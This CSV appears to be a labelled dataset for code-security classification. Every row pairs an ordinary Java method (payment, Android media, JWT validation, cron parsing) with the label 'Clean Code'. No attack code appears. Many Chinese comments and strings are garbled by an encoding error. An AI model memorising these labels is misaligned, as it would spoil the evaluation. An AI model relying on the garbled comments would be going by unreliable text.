text,label,text_label
"/** 
 * 鏍￠獙鏄惁鑳介��娆�
 * @param refundId 鏀粯閫�娆惧崟 id
 * @param walletPayNo 閽卞寘鏀粯 no
 */
private Long validateWalletCanRefund(Long refundId,String walletPayNo){
  PayWalletTransactionDO walletTransaction=walletTransactionService.getWalletTransactionByNo(walletPayNo);
  if (walletTransaction == null) {
    throw exception(WALLET_TRANSACTION_NOT_FOUND);
  }
  PayWalletTransactionDO refundTransaction=walletTransactionService.getWalletTransaction(String.valueOf(refundId),PAYMENT_REFUND);
  if (refundTransaction != null) {
    throw exception(WALLET_REFUND_EXIST);
  }
  return walletTransaction.getWalletId();
}
",0,Clean Code
"/** 
 * Gets the translation provider for workspace pages.
 */
public PageTranslationProvider getWorkspacePageTranslationProvider(Launcher launcher){
  if (!(this == SPRING_LOADED || this == EDIT_MODE) || !launcher.getDeviceProfile().isTwoPanels) {
    return DEFAULT_PAGE_TRANSLATION_PROVIDER;
  }
  final float quarterPageSpacing=launcher.getWorkspace().getPageSpacing() / 4f;
  return new PageTranslationProvider(DECELERATE_2){
    @Override public float getPageTranslation(    int pageIndex){
      boolean isRtl=launcher.getWorkspace().mIsRtl;
      boolean isFirstPage=pageIndex % 2 == 0;
      return ((isFirstPage && !isRtl) || (!isFirstPage && isRtl)) ? -quarterPageSpacing : quarterPageSpacing;
    }
  }
;
}",0,Clean Code
"@Override public void invoke(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv,Context context,Function callFunc){
  ALoc retALoc=getReturnALoc(callFunc,false);
  if (retALoc == null) {
    return;
  }
  KSet ptrKSet=getParamKSet(callFunc,0,inOutEnv);
  if (ptrKSet.isTop()) {
    inOutEnv.set(retALoc,ptrKSet,true);
    return;
  }
  long taints=0;
  for (  AbsVal ptr : ptrKSet) {
    ALoc tmp=ALoc.getALoc(ptr.getRegion(),ptr.getValue(),1);
    Entry<ALoc,KSet> entry=inOutEnv.getOverlapEntry(tmp);
    if (entry != null && entry.getValue().isTop() && entry.getValue().isTaint()) {
      taints|=entry.getValue().getTaints();
    }
  }
  inOutEnv.set(retALoc,KSet.getTop(taints),true);
}",0,Clean Code
"/** 
 * Initializes the wrapper for loading a chunk.
 * @param chunkUid The chunk's uid.
 * @param shouldSpliceIn Whether the samples parsed from the chunk should be spliced into anysamples already queued to the wrapper.
 * @param reusingExtractor Whether the extractor for the chunk has already been used for precedingchunks.
 */
public void init(int chunkUid,boolean shouldSpliceIn,boolean reusingExtractor){
  if (!reusingExtractor) {
    sampleQueueMappingDoneByType.clear();
  }
  this.chunkUid=chunkUid;
  for (  SampleQueue sampleQueue : sampleQueues) {
    sampleQueue.sourceId(chunkUid);
  }
  if (shouldSpliceIn) {
    for (    SampleQueue sampleQueue : sampleQueues) {
      sampleQueue.splice();
    }
  }
}
",0,Clean Code
"/** 
 * 浣跨敤澶氫釜妯″紡锛岄伩鍏峱ost妯″紡绛塩atch涓嶄綇鐨勯棶棰�
 * @param exchange {@link ServerWebExchange}
 * @return result
 */
@RequestMapping public TeslaGatewayResult fallBack(ServerWebExchange exchange){
  Throwable exception=exchange.getAttribute(ServerWebExchangeUtils.CIRCUITBREAKER_EXECUTION_EXCEPTION_ATTR);
  HttpStatus status=HttpStatus.SERVICE_UNAVAILABLE;
  String message=HttpStatus.SERVICE_UNAVAILABLE.getReasonPhrase();
  if (exception != null) {
    exchange.getResponse().setStatusCode(HttpStatus.SERVICE_UNAVAILABLE);
    status=HttpStatus.SERVICE_UNAVAILABLE;
    message=""service is not available, please try again later. "" + Optional.ofNullable(exception.getLocalizedMessage()).orElse(StringUtils.EMPTY);
    exchange.getRequest().getId();
  }
  log.warn(""actionName=fallback||requestId={}||status={}||message={}"",exchange.getRequest().getId(),status,message,exception);
  exchange.getResponse().setStatusCode(status);
  return TeslaGatewayResult.builder().message(message).path(exchange.getRequest().getPath().value()).status(status.value()).timestamp(new Date()).requestId(exchange.getRequest().getId()).from(TeslaGatewayResult.GATEWAY_FLAG).build();
}
",0,Clean Code
"public static int c3(int n){
  if (n < 1) {
    return 0;
  }
  if (n == 1 || n == 2 || n == 3) {
    return n;
  }
  int[][] base={{1,1,0},{0,0,1},{1,0,0}};
  int[][] res=matrixPower(base,n - 3);
  return 3 * res[0][0] + 2 * res[1][0] + res[2][0];
}",0,Clean Code
"public static int process(int x,int y,int rest,int a,int b){
  if (x < 0 || x > 9 || y < 0 || y > 8) {
    return 0;
  }
  if (rest == 0) {
    return (x == a && y == b) ? 1 : 0;
  }
  int ways=process(x + 2,y + 1,rest - 1,a,b);
  ways+=process(x + 1,y + 2,rest - 1,a,b);
  ways+=process(x - 1,y + 2,rest - 1,a,b);
  ways+=process(x - 2,y + 1,rest - 1,a,b);
  ways+=process(x - 2,y - 1,rest - 1,a,b);
  ways+=process(x - 1,y - 2,rest - 1,a,b);
  ways+=process(x + 1,y - 2,rest - 1,a,b);
  ways+=process(x + 2,y - 1,rest - 1,a,b);
  return ways;
}",0,Clean Code
"public static Mono<ParsedEmailTemplate> convert(EmailTemplate template,Map<String,Object> context){
  return template.getSendTo(context).flatMapMany(Flux::fromIterable).map(receiver -> template.render(receiver,context)).collectList().map(sendToList -> {
    String subject=template.getSubject();
    String text=template.getText();
    if (CollectionUtils.isEmpty(sendToList) || ObjectUtils.isEmpty(subject) || ObjectUtils.isEmpty(text)) {
      throw new BusinessException(""妯℃澘鍐呭閿欒锛宻endTo, text 鎴栬�� subject 涓嶈兘涓虹┖."");
    }
    String sendText=template.render(text,context);
    List<EmailTemplate.Attachment> tempAttachments=template.getAttachments();
    Map<String,String> attachments=new LinkedHashMap<>();
    if (tempAttachments != null) {
      int index=0;
      for (      EmailTemplate.Attachment tempAttachment : tempAttachments) {
        index++;
        String name=template.render(tempAttachment.getName(),context);
        String location=template.get(tempAttachment.getLocation(),EmailTemplate.Attachment.locationKey(index),context);
        attachments.put(name,location);
      }
    }
    Map<String,String> images=new HashMap<>();
    sendText=extractSendTextImage(sendText,images);
    return ParsedEmailTemplate.builder().attachments(attachments).images(images).text(sendText).subject(template.render(subject,context)).sendTo(sendToList).build();
  }
);
}",0,Clean Code
"@Test public void clientShouldBeAbleToSendMessageToSingleApp(){
  WebSocketClient webSocketUserClient=new WebSocketClient(port,createClientTokenCredentials(USER_TOKEN));
  try {
    assertConnected(webSocketUserClient);
    WebSocketClient webSocketAppClient1=null;
    WebSocketClient webSocketAppClient2=null;
    try {
      webSocketAppClient1=new WebSocketClient(port,createAppCredentials(API_KEY,""123""));
      assertConnected(webSocketAppClient1);
      webSocketAppClient2=new WebSocketClient(port,createAppCredentials(API_KEY,""456""));
      assertConnected(webSocketAppClient2);
      TestRequest message=new TestRequest(Arrays.asList(""123""));
      webSocketUserClient.send(message);
      TestRequest app1Message=webSocketAppClient1.read(TestRequest.class,WAIT_SECS,TimeUnit.SECONDS);
      TestRequest app2Message=webSocketAppClient2.read(TestRequest.class,WAIT_SECS,TimeUnit.SECONDS);
      assertThat(app1Message,is(message));
      assertThat(app2Message,is(IsNull.nullValue()));
    }
  finally {
      if (webSocketAppClient1 != null) {
        webSocketAppClient1.close();
      }
      if (webSocketAppClient2 != null) {
        webSocketAppClient2.close();
      }
    }
  }
  finally {
    webSocketUserClient.close();
  }
}",0,Clean Code
"@Nonnull @Override protected List<VariableDefinition> getEmbeddedVariables(){
  if (toAllUser || StringUtils.hasText(userIdList) || StringUtils.hasText(departmentIdList)) {
    return Collections.emptyList();
  }
  List<VariableDefinition> variables=new ArrayList<>(2);
  variables.add(VariableDefinition.builder().id(USER_ID_LIST_KEY).name(""鏀朵俊浜�"").expand(NotifyVariableBusinessConstant.businessId,NotifyVariableBusinessConstant.NotifyVariableBusinessTypes.userType).type(StringType.ID).build());
  variables.add(VariableDefinition.builder().id(DEPARTMENT_ID_LIST_KEY).name(""鏀朵俊浜洪儴闂�"").expand(NotifyVariableBusinessConstant.businessId,NotifyVariableBusinessConstant.NotifyVariableBusinessTypes.orgType).type(StringType.ID).build());
  return variables;
}",0,Clean Code
"void stopSeek(boolean cancelled){
  if (!mInSeek) {
    return;
  }
  mInSeek=false;
  mSeekClient.onSeekFinished(cancelled);
  if (mSeekDataProvider != null) {
    mSeekDataProvider.reset();
  }
  mThumbHeroIndex=-1;
  mThumbsBar.clearThumbBitmaps();
  mSeekDataProvider=null;
  mPositions=null;
  mPositionsLength=0;
  mControlsVh.view.setVisibility(View.VISIBLE);
  mSecondaryControlsVh.view.setVisibility(View.VISIBLE);
  mDescriptionViewHolder.view.setVisibility(View.VISIBLE);
  mThumbsBar.setVisibility(View.INVISIBLE);
}",0,Clean Code
"/** 
 * 鏂板娲诲姩璁板綍
 * @param type           type
 * @param activityEnum   绫诲瀷
 * @param activityTypeId 绫诲瀷ID
 * @param businessChange 鍟嗘満鍙樺姩
 */
@Override public void addActivity(Integer type,CrmActivityEnum activityEnum,Integer activityTypeId,String businessChange){
  String content="""";
  if (type == 2) {
    content=""鍒涘缓浜�"" + activityEnum.getRemarks() + "": "";
  }
 else   if (type == 3) {
    content=businessChange;
  }
  CrmActivity crmActivity=new CrmActivity();
  crmActivity.setType(type);
  crmActivity.setActivityType(activityEnum.getType());
  crmActivity.setActivityTypeId(activityTypeId);
  crmActivity.setContent(content);
  crmActivity.setCreateUserId(UserUtil.getUserId());
  crmActivity.setCreateTime(new Date());
  save(crmActivity);
}
/** 
 * 鏂板娲诲姩璁板綍
 * @param type           type
 * @param activityEnum   绫诲瀷
 * @param activityTypeId 绫诲瀷ID
 */
@Override public void addActivity(Integer type,CrmActivityEnum activityEnum,Integer activityTypeId){
  addActivity(type,activityEnum,activityTypeId,"""");
}",0,Clean Code
"private <J2 extends J>JRightPadded<J2> minimumLines(JRightPadded<J2> tree,int min){
  return tree.withElement(minimumLines(tree.getElement(),min));
}
private <J2 extends J>J2 minimumLines(J2 tree,int min){
  return tree.withPrefix(minimumLines(tree.getPrefix(),min));
}
private Space minimumLines(Space prefix,int min){
  if (min == 0) {
    return prefix;
  }
  if (prefix.getComments().isEmpty() || prefix.getWhitespace().contains(""\n"") || prefix.getComments().get(0) instanceof Javadoc|| (prefix.getComments().get(0).isMultiline() && prefix.getComments().get(0).printComment(getCursor()).contains(""\n""))) {
    return prefix.withWhitespace(minimumLines(prefix.getWhitespace(),min));
  }
  return prefix.withComments(ListUtils.map(prefix.getComments(),(i,c) -> i == 0 ? c.withSuffix(minimumLines(c.getSuffix(),min)) : c));
}
public static String minimumLines(String whitespace,int min){
  if (min == 0) {
    return whitespace;
  }
  String minWhitespace=whitespace;
  for (int i=0; i < min - getNewLineCount(whitespace) + 1; i++) {
    minWhitespace=""\n"" + minWhitespace;
  }
  return minWhitespace;
}",0,Clean Code
"public static String getCookieValue(ServerHttpRequest request,String key){
  return getCookieValue(request,key,StringUtils.EMPTY);
}
public static String getCookieValue(ServerHttpRequest request,String key,String defaultValue){
  HttpCookie cookie=request.getCookies().getFirst(key);
  if (cookie == null) {
    return defaultValue;
  }
  return cookie.getValue();
}
public static String getCookieValue(HttpRequest request,String key){
  String first=request.getHeaders().getFirst(HttpHeaders.COOKIE);
  if (StringUtils.isEmpty(first)) {
    return StringUtils.EMPTY;
  }
  String[] cookieArray=StringUtils.split(first,"";"");
  for (  String cookieItem : cookieArray) {
    String[] cookieKv=StringUtils.split(cookieItem,""="");
    if (cookieKv != null && cookieKv.length == 2 && StringUtils.equals(cookieKv[0],key)) {
      return cookieKv[1];
    }
  }
  return StringUtils.EMPTY;
}",0,Clean Code
"@Override public void didFailedLoadingFile(FileLoadOperation operation,int reason){
  loadOperationPathsUI.remove(fileName);
  checkDownloadQueue(operation,operation.getQueue());
  if (getDelegate() != null) {
    delegate.fileDidFailedLoad(fileName,reason);
  }
  if (document != null && parentObject instanceof MessageObject && reason == 0) {
    getDownloadController().onDownloadFail((MessageObject)parentObject,reason);
  }
 else   if (reason == -1) {
    LaunchActivity.checkFreeDiscSpaceStatic(2);
  }
}",0,Clean Code
"public static <T>T downloadStringCached(String url,String cacheName,ParseCallback<T> parseCallback) throws IOException, ParseException {
  File cacheDestination=new File(Tools.DIR_CACHE,""string_cache/"" + cacheName);
  if (cacheDestination.isFile() && cacheDestination.canRead() && System.currentTimeMillis() < (cacheDestination.lastModified() + 86400000)) {
    try {
      String cachedString=Tools.read(new FileInputStream(cacheDestination));
      return parseCallback.process(cachedString);
    }
 catch (    IOException e) {
      Log.i(""DownloadUtils"",""Failed to read the cached file"",e);
    }
catch (    ParseException e) {
      Log.i(""DownloadUtils"",""Failed to parse the cached file"",e);
    }
  }
  String urlContent=DownloadUtils.downloadString(url);
  T parseResult=parseCallback.process(urlContent);
  boolean tryWriteCache;
  if (cacheDestination.exists()) {
    tryWriteCache=cacheDestination.canWrite();
  }
 else {
    tryWriteCache=FileUtils.ensureParentDirectorySilently(cacheDestination);
  }
  if (tryWriteCache)   try {
    Tools.write(cacheDestination.getAbsolutePath(),urlContent);
  }
 catch (  IOException e) {
    Log.i(""DownloadUtils"",""Failed to cache the string"",e);
  }
  return parseResult;
}",0,Clean Code
"public static Node midOrUpMidNode(Node head){
  if (head == null || head.next == null || head.next.next == null) {
    return head;
  }
  Node slow=head.next;
  Node fast=head.next.next;
  while (fast.next != null && fast.next.next != null) {
    slow=slow.next;
    fast=fast.next.next;
  }
  return slow;
}
",0,Clean Code
"@Override public long selectTracks(TrackSelection[] selections,boolean[] mayRetainStreamFlags,SampleStream[] streams,boolean[] streamResetFlags,long positionUs){
  for (int i=0; i < selections.length; i++) {
    if (streams[i] != null && (selections[i] == null || !mayRetainStreamFlags[i])) {
      sampleStreams.remove(streams[i]);
      streams[i]=null;
    }
    if (streams[i] == null && selections[i] != null) {
      SampleStreamImpl stream=new SampleStreamImpl();
      sampleStreams.add(stream);
      streams[i]=stream;
      streamResetFlags[i]=true;
    }
  }
  return positionUs;
}",0,Clean Code
"public boolean requestCaCertificate(){
  if (mService == null) {
    Log.e(TAG,""Not connected"");
    return false;
  }
  Message msg=Message.obtain(null,MitmAPI.MSG_GET_CA_CERTIFICATE);
  msg.replyTo=mMessenger;
  try {
    mService.send(msg);
    return true;
  }
 catch (  RemoteException e) {
    e.printStackTrace();
    return false;
  }
}
",0,Clean Code
"/** 
 * Updates message by its id if it exists, add to start if not
 * @param message message object to insert or update.
 */
public void upsert(MESSAGE message){
  if (!update(message)) {
    addToStart(message,false);
  }
}
/** 
 * Updates and moves to start if message by its id exists and if specified move to start, if not specified the item stays at current position and updated
 * @param message message object to insert or update.
 */
public void upsert(MESSAGE message,boolean moveToStartIfUpdate){
  if (moveToStartIfUpdate) {
    if (getMessagePositionById(message.getId()) > 0) {
      updateAndMoveToStart(message);
    }
 else {
      upsert(message);
    }
  }
 else {
    upsert(message);
  }
}",0,Clean Code
"/** 
 * validate token
 * @param token token
 * @return whether valid
 */
public boolean validateToken(String token){
  try {
    Jwts.parser().setSigningKey(secretKey).parseClaimsJws(token);
    return true;
  }
 catch (  SignatureException e) {
    log.info(""Invalid JWT signature."");
    log.trace(""Invalid JWT signature trace: {}"",e);
  }
catch (  MalformedJwtException e) {
    log.info(""Invalid JWT token."");
    log.trace(""Invalid JWT token trace: {}"",e);
  }
catch (  ExpiredJwtException e) {
    log.info(""Expired JWT token."");
    log.trace(""Expired JWT token trace: {}"",e);
  }
catch (  UnsupportedJwtException e) {
    log.info(""Unsupported JWT token."");
    log.trace(""Unsupported JWT token trace: {}"",e);
  }
catch (  IllegalArgumentException e) {
    log.info(""JWT token compact of handler are invalid."");
    log.trace(""JWT token compact of handler are invalid trace: {}"",e);
  }
  return false;
}
",0,Clean Code
"/** 
 * 鏇存柊 container 涓寚瀹� spec 涓殑 key 瀵瑰簲鐨勫唴瀹�
 * @param containers 瀹瑰櫒鍒楄〃
 * @param key        Key
 * @param spec       鏄犲皠鍐呭
 */
private static void appendContainerSpec(JSONArray containers,String key,JSONArray spec){
  if (containers != null) {
    for (int i=0; i < containers.size(); i++) {
      JSONObject container=containers.getJSONObject(i);
      JSONArray originValues=container.getJSONArray(key);
      if (originValues == null) {
        container.put(key,new JSONArray());
        originValues=container.getJSONArray(key);
      }
      originValues.addAll(spec);
    }
  }
}",0,Clean Code
"/** 
 * construct jdbc url due the jdbc protocol
 * @param jdbcProtocol jdbc
 * @return URL
 */
private String constructDatabaseUrl(JdbcProtocol jdbcProtocol){
  if (Objects.nonNull(jdbcProtocol.getUrl()) && !Objects.equals("""",jdbcProtocol.getUrl()) && jdbcProtocol.getUrl().startsWith(""jdbc"")) {
    return jdbcProtocol.getUrl();
  }
  return null;
}
",0,Clean Code
"private ResultSetWrapper getNextResultSet(Statement stmt){
  try {
    if (stmt.getConnection().getMetaData().supportsMultipleResultSets() && (stmt.getMoreResults() || (stmt.getUpdateCount() != -1))) {
      ResultSet rs=stmt.getResultSet();
      if (rs == null) {
        return getNextResultSet(stmt);
      }
      return new ResultSetWrapper(rs,configuration);
    }
  }
 catch (  Exception e) {
  }
  return null;
}",0,Clean Code
"/** 
 * 鏇存柊鍟嗗搧鍚庨渶瑕佸悓姝ユ洿鏂扮储寮曪紝鍏堝垹鍚庡
 * @param jp 杩炴帴鐐�
 * @param result 杩斿洖鍊�
 * @throws JsonProcessingException 鎶涘嚭
 */
@AfterReturning(value=""execution(* com.supermarket.product.service.ProductService*.updateProduct(..))"",returning=""result"") public void afterUpdateProduct(JoinPoint jp,Object result) throws JsonProcessingException {
  Map<String,Object> map=new HashMap<String,Object>();
  Object[] values=jp.getArgs();
  String[] names=((CodeSignature)jp.getSignature()).getParameterNames();
  for (int i=0; i < names.length; i++) {
    map.put(names[i],values[i]);
  }
  Product product=(Product)map.get(""product"");
  CommonResult<?> deleteResult=this.searchService.deleteProduct(product);
  this.afterAddProduct(jp,result);
}",0,Clean Code
"@Override protected void initUndoHistory(){
  final int x=getCaretEndPosX();
  final int y=getCaretMouseReleasedY();
  final ZyLineContent lineContent=getLineContent(y);
  final IZyEditableObject lineFragmentObject=lineContent.getLineFragmentObjectAt(x);
  m_editableObject=lineContent.getLineObject();
  if (lineFragmentObject != null) {
    String text=lineContent.getText().substring(lineFragmentObject.getStart(),lineFragmentObject.getEnd());
    m_isAboveComment=isAboveLineComment(y);
    m_isBehindComment=isBehindLineComment(x,y);
    m_isLabelComment=isLabelComment(y);
    if (isComment(x,y)) {
      text=getMultiLineComment(y);
    }
    udpateUndolist(getLabelContent(),lineContent.getLineObject().getPersistentModel(),m_editableObject,text,isAboveLineComment(y),isBehindLineComment(x,y),isLabelComment(y),getCaretStartPosX(),getCaretMousePressedX(),getCaretMousePressedY(),getCaretEndPosX(),getCaretMouseReleasedX(),getCaretMouseReleasedY());
  }
}
",0,Clean Code
"/** 
 * Read an ECMA array from an AMF encoded buffer.
 * @param data The buffer from which to read.
 * @return The value read from the buffer.
 */
private static HashMap<String,Object> readAmfEcmaArray(ParsableByteArray data){
  int count=data.readUnsignedIntToInt();
  HashMap<String,Object> array=new HashMap<>(count);
  for (int i=0; i < count; i++) {
    String key=readAmfString(data);
    int type=readAmfType(data);
    Object value=readAmfData(data,type);
    if (value != null) {
      array.put(key,value);
    }
  }
  return array;
}",0,Clean Code
"@Override public void onPropsSet(){
  super.onPropsSet();
  if (!mImageNeedsDownload || mSourceMap == null || mScene == null) {
    return;
  }
  imageDownloadDidStart();
  invalidateImageDownloadListeners();
  final Context context=getContext();
  if (mIsHdr) {
    mHDRDownloadListener=new HDRImageDownloadListener();
    HdrImageDownloader.getHdrTextureAsync(mSourceMap,mHDRDownloadListener,context);
  }
 else {
    ImageDownloader downloader=new ImageDownloader(context);
    downloader.setTextureFormat(mFormat);
    mImageDownloadListener=new Image360DownloadListener();
    downloader.getImageAsync(mSourceMap,mImageDownloadListener);
  }
  mImageNeedsDownload=false;
}",0,Clean Code
"/** 
 * 杞崲涓篖ong鏁扮粍<br>
 * @param str 琚浆鎹㈢殑鍊�
 * @return 缁撴灉
 */
public static Long[] toLongArray(String str){
  return toLongArray("","",str);
}
/** 
 * 杞崲涓篖ong鏁扮粍<br>
 * @param split 鍒嗛殧绗�
 * @param str   琚浆鎹㈢殑鍊�
 * @return 缁撴灉
 */
public static Long[] toLongArray(String split,String str){
  if (StringUtils.isEmpty(str)) {
    return new Long[]{};
  }
  String[] arr=str.split(split);
  final Long[] longs=new Long[arr.length];
  for (int i=0; i < arr.length; i++) {
    final Long v=toLong(arr[i],null);
    longs[i]=v;
  }
  return longs;
}",0,Clean Code
"public static Object escapeXml(Object obj){
  if (obj == null) {
    return null;
  }
 else   if (obj instanceof CharSequence) {
    return escapeXml((CharSequence)obj);
  }
 else {
    return obj;
  }
}
public static String escapeXml(CharSequence str){
  if (str == null) {
    return null;
  }
  StringBuilder res=null;
  int strLength=str.length();
  for (int i=0; i < strLength; i++) {
    char c=str.charAt(i);
    String repl=encodeXMLChar(c);
    if (repl == null) {
      if (res != null) {
        res.append(c);
      }
    }
 else {
      if (res == null) {
        res=new StringBuilder(str.length() + 5);
        for (int k=0; k < i; k++) {
          res.append(str.charAt(k));
        }
      }
      res.append(repl);
    }
  }
  return res == null ? str.toString() : res.toString();
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void updateBusinessStatus(CrmBusinessStatusSaveReqVO updateReqVO){
  validateBusinessStatusTypeExists(updateReqVO.getId());
  validateBusinessStatusTypeNameUnique(updateReqVO.getName(),updateReqVO.getId());
  int sort=0;
  for (  CrmBusinessStatusSaveReqVO.Status status : updateReqVO.getStatuses()) {
    status.setSort(sort++);
  }
  if (businessService.getBusinessCountByStatusTypeId(updateReqVO.getId()) > 0) {
    throw exception(BUSINESS_STATUS_UPDATE_FAIL_USED);
  }
  CrmBusinessStatusTypeDO updateObj=BeanUtils.toBean(updateReqVO,CrmBusinessStatusTypeDO.class);
  businessStatusTypeMapper.updateById(updateObj);
  updateBusinessStatus(updateReqVO.getId(),BeanUtils.toBean(updateReqVO.getStatuses(),CrmBusinessStatusDO.class));
}
private void updateBusinessStatus(Long id,List<CrmBusinessStatusDO> newList){
  List<CrmBusinessStatusDO> oldList=businessStatusMapper.selectListByTypeId(id);
  List<List<CrmBusinessStatusDO>> diffList=diffList(oldList,newList,(oldVal,newVal) -> oldVal.getId().equals(newVal.getId()));
  if (CollUtil.isNotEmpty(diffList.get(0))) {
    diffList.get(0).forEach(o -> o.setTypeId(id));
    businessStatusMapper.insertBatch(diffList.get(0));
  }
  if (CollUtil.isNotEmpty(diffList.get(1))) {
    businessStatusMapper.updateBatch(diffList.get(1));
  }
  if (CollUtil.isNotEmpty(diffList.get(2))) {
    businessStatusMapper.deleteBatchIds(convertSet(diffList.get(2),CrmBusinessStatusDO::getId));
  }
}",0,Clean Code
"public static String[] splitString(String str,int chunkSize){
  if (str == null || str.isEmpty() || chunkSize <= 0) {
    return null;
  }
  int len=str.length();
  int arrayLen=(len + chunkSize - 1) / chunkSize;
  String[] result=new String[arrayLen];
  int k=0;
  for (int i=0; i < len; i+=chunkSize) {
    int endIndex=Math.min(i + chunkSize,len);
    result[k++]=str.substring(i,endIndex);
  }
  return result;
}",0,Clean Code
"protected void buildExpression(String expression) throws ParseException {
  expressionParsed=true;
  try {
    if (seconds == null) {
      seconds=new TreeSet<Integer>();
    }
    if (minutes == null) {
      minutes=new TreeSet<Integer>();
    }
    if (hours == null) {
      hours=new TreeSet<Integer>();
    }
    if (daysOfMonth == null) {
      daysOfMonth=new TreeSet<Integer>();
    }
    if (months == null) {
      months=new TreeSet<Integer>();
    }
    if (daysOfWeek == null) {
      daysOfWeek=new TreeSet<Integer>();
    }
    if (years == null) {
      years=new TreeSet<Integer>();
    }
    int exprOn=SECOND;
    StringTokenizer exprsTok=new StringTokenizer(expression,"" \t"",false);
    while (exprsTok.hasMoreTokens() && exprOn <= YEAR) {
      String expr=exprsTok.nextToken().trim();
      if (exprOn == DAY_OF_MONTH && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' and 'LW' with other days of the month is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' with other days of the week is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('#') != -1 && expr.indexOf('#',expr.indexOf('#') + 1) != -1) {
        throw new ParseException(""Support for specifying multiple \""nth\"" days is not implemented."",-1);
      }
      StringTokenizer vTok=new StringTokenizer(expr,"","");
      while (vTok.hasMoreTokens()) {
        String v=vTok.nextToken();
        storeExpressionVals(0,v,exprOn);
      }
      exprOn++;
    }
    if (exprOn <= DAY_OF_WEEK) {
      throw new ParseException(""Unexpected end of expression."",expression.length());
    }
    if (exprOn <= YEAR) {
      storeExpressionVals(0,""*"",YEAR);
    }
    TreeSet<Integer> dow=getSet(DAY_OF_WEEK);
    TreeSet<Integer> dom=getSet(DAY_OF_MONTH);
    boolean dayOfMSpec=!dom.contains(NO_SPEC);
    boolean dayOfWSpec=!dow.contains(NO_SPEC);
    if (!dayOfMSpec || dayOfWSpec) {
      if (!dayOfWSpec || dayOfMSpec) {
        throw new ParseException(""Support for specifying both a day-of-week AND a day-of-month parameter is not implemented."",0);
      }
    }
  }
 catch (  ParseException pe) {
    throw pe;
  }
catch (  Exception e) {
    throw new ParseException(""Illegal cron expression format ("" + e.toString() + "")"",0);
  }
}",0,Clean Code
"/** 
 * 璁剧疆浼佷笟閰嶇疆
 */
@Override public void setAdminConfig(AdminCompanyBO adminCompanyBO){
  String companyKey=""companyInfo"";
  AdminConfig adminConfig=lambdaQuery().eq(AdminConfig::getName,companyKey).last("" limit 1"").one();
  if (adminConfig == null) {
    adminConfig=new AdminConfig();
    adminConfig.setName(companyKey);
    adminConfig.setStatus(1);
    adminConfig.setDescription(""浼佷笟LOGO閰嶇疆"");
  }
  adminConfig.setValue(JSON.toJSONString(adminCompanyBO));
  saveOrUpdate(adminConfig);
}",0,Clean Code
"@Override public void onSurfaceTextureAvailable(SurfaceTexture surface,int width,int height){
  if (eglThread == null && surface != null && currentVideoPlayer != null) {
    eglThread=new FilterGLThread(surface,surfaceTexture -> {
      if (currentVideoPlayer == null) {
        return;
      }
      Surface s=new Surface(surfaceTexture);
      currentVideoPlayer.setSurface(s);
    }
);
    if (videoWidth != 0 && videoHeight != 0) {
      eglThread.setVideoSize(videoWidth,videoHeight);
    }
    eglThread.setSurfaceTextureSize(width,height);
    eglThread.requestRender(true,true,false);
    if (delegate != null) {
      delegate.onEGLThreadAvailable(eglThread);
    }
  }
}",0,Clean Code
